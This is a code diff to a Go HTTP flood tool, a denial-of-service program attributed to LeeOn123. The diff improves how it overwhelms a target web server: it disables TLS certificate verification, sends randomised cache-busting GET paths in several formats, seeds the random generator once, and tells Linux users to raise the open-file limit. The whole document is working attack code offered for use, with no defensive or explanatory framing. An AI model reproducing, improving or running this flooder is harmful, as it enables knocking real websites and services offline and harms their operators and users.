@@ -1,6 +1,9 @@
 /*
 Coded by LeeOn123
 Please fking code ur script by ur self, kid.
+
+I changed the random integers range to the max of int32.
+Now 386 systems should work well.
 */
 package main
 
@@ -121,7 +124,11 @@ var (
 	page string
 )
 
-func contain(char string, x string) int {
+func init() {
+	rand.Seed(time.Now().UnixNano()) //fixed seed problem
+}
+
+func contain(char string, x string) int { //simple compare
 	times := 0
 	ans := 0
 	for i := 0; i < len(char); i++ {
@@ -190,17 +197,13 @@ func flood() {
 	}
 	var s net.Conn
 	var err error
-	rand.Seed(time.Now().UnixNano())
-	<-start
-	for { /*
-			request := ""
-			if os.Args[5] == "get" {
-				var rand_url = strconv.Itoa(rand.Intn(1000000000))
-				request += "GET " + os.Args[4] + "?" + rand_url
-			}
-			request += header + "\r\n\r\n"*/
+	<-start //received signal
+	for {
 		if os.Args[2] == "443" {
-			s, err = tls.Dial("tcp", addr, nil)
+			cfg := &tls.Config{
+				InsecureSkipVerify: true,
+			}
+			s, err = tls.Dial("tcp", addr, cfg)
 		} else {
 			s, err = net.Dial("tcp", addr)
 		}
@@ -208,18 +211,34 @@ func flood() {
 			fmt.Println("Connection Down!!!")
 		} else {
 			defer s.Close()
+			ai := rand.Intn(3) //fake random url format
 			for i := 0; i <= 100; i++ {
 				request := ""
 				if os.Args[5] == "get" {
-					request += "GET " + os.Args[4] + page + strconv.Itoa(rand.Intn(1000000000000000000)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + strconv.Itoa(rand.Intn(1000000000000000000)) + string(abcd[rand.Intn(len(abcd))])
+					request += "GET " + os.Args[4] + page
+					if ai == 0 {
+						request += strconv.Itoa(rand.Intn(2147483647)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + strconv.Itoa(rand.Intn(2147483647)) + string(abcd[rand.Intn(len(abcd))])
+					} else if ai == 1 {
+						request += strconv.Itoa(rand.Intn(2147483647)) + strconv.Itoa(rand.Intn(2147483647)) + strconv.Itoa(rand.Intn(2147483647)) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + strconv.Itoa(rand.Intn(2147483647))
+					} else if ai == 2 {
+						request += string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + strconv.Itoa(rand.Intn(2147483647))
+						for boring := 0; boring < 7; boring++ {
+							request += string(abcd[rand.Intn(len(abcd))])
+						}
+					} else if ai == 3 {
+						request += strconv.Itoa(rand.Intn(2147483647))
+						for boring := 0; boring < 10; boring++ {
+							request += string(abcd[rand.Intn(len(abcd))])
+						}
+					}
 				}
 				request += header + "\r\n\r\n"
 				s.Write([]byte(request))
-				//time.Sleep(time.Millisecond * 200)
+				//time.Sleep(time.Millisecond * 200)//Sent delay can reduce i/o usage
 			}
 		}
 		//time.Sleep(time.Second * 1)
-		//fmt.Println("Threads@", threads, " Hitting Target -->", url)
+		//fmt.Println("Threads@", threads, " Hitting Target -->", url)// For those who like share to skid.
 	}
 }
 
@@ -230,11 +249,12 @@ func main() {
 	fmt.Println(" ||  ||    ||      ||     ||  ||      ||       ||  ||  || ||  || ||  ||  ")
 	fmt.Println(".||  ||.   `|..'   `|..'  ||..|'     .||.     .||. `|..|' `|..|' `|..||. ")
 	fmt.Println("                          ||                                             ")
-	fmt.Println("                         .||                     Golang version 1.6      ")
+	fmt.Println("                         .||                     Golang version 1.7      ")
 	fmt.Println("                                                        C0d3d By L330n123")
 	fmt.Println("==========================================================================")
 	if len(os.Args) != 8 {
 		fmt.Println("Post Mode will use header.txt as data")
+		fmt.Println("If you are using linux please run 'ulimit -n 999999' first!!!")
 		fmt.Println("Usage: ", os.Args[0], "<ip> <port> <threads> <page> <get/post> <seconds> <header.txt/nil>")
 		os.Exit(1)
 	}
